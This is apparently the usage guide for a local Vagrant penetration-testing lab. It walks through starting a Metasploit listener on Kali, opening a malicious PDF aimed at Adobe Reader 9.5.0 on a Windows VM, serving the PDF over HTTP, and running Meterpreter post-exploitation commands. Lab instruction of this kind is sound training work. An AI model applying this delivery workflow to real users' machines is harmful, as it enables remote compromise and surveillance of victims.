# How to Use the Lab

## Quick Start (Recommended) 🎯

The malicious PDFs are **already on the Windows Desktop** after `vagrant up`!

### Step 1: Start the listener on Kali
```bash
vagrant ssh kali
cd /vagrant/exploits
./start_attack.sh
```

### Step 2: Double-click the PDF on Windows
Open the Windows VM and double-click:
- **`JOAN-ESPINACH-TRD.pdf`** on the Desktop

### Step 3: Get Meterpreter!
You should see "Meterpreter session opened" on Kali.

**That's it!** Three simple steps.

---

## Advanced Mode (HTTP Server Simulation) 🌐

Want to simulate web-based delivery? Use this mode.

### Terminal 1: Start HTTP server
```bash
vagrant ssh kali
/vagrant/exploits/serve_pdf.sh
```

### Terminal 2: Start listener
```bash
vagrant ssh kali
cd /vagrant/exploits
./start_attack.sh
```

### On Windows: Download via HTTP
Double-click `download_and_open.ps1` on Desktop
- Or manually browse to: `http://192.168.56.101:8080/`

---

## Available Scripts

| Script | Purpose | When to Use |
|--------|---------|-------------|
| **`start_attack.sh`** | Start Metasploit listener | **Always** (required for both modes) |
| **`generate_pdf.sh`** | Generate malicious PDFs | Only if you want custom PDFs |
| **`serve_pdf.sh`** | HTTP server for PDFs | **Optional** (Advanced Mode only) |
| **`create_proof.sh`** | Create proof file | After successful compromise |

---

## Typical Lab Session

```bash
# 1. Start VMs
vagrant up

# 2. Start listener
vagrant ssh kali
cd /vagrant/exploits && ./start_attack.sh

# 3. On Windows: Double-click JOAN-ESPINACH-TRD.pdf

# 4. Use Meterpreter
sessions -i 1
sysinfo
screenshot
```

---

## Troubleshooting

**Listener won't start:**
- Check if Metasploit is installed: `msfconsole --version`

**PDF doesn't trigger exploit:**
- Make sure Adobe Reader 9.5.0 is installed
- Try the alternative PDF: `JOAN-ESPINACH-ALT.pdf`

**HTTP server issues (Advanced Mode):**
- Check PDFs exist: `ls ~/.msf4/local/*.pdf`
- If missing, run: `./generate_pdf.sh`

See `TROUBLESHOOTING.md` for more help.

---

## What Each Mode Teaches

### Quick Start Mode
- ✅ How PDF exploits work
- ✅ Metasploit listener setup
- ✅ Meterpreter post-exploitation
- ✅ Perfect for beginners

### Advanced Mode
- ✅ Everything from Quick Start
- ✅ HTTP-based malware delivery
- ✅ Network traffic analysis
- ✅ Realistic attack simulation

---

**Recommendation:** Start with Quick Start mode, then try Advanced mode once you're comfortable.
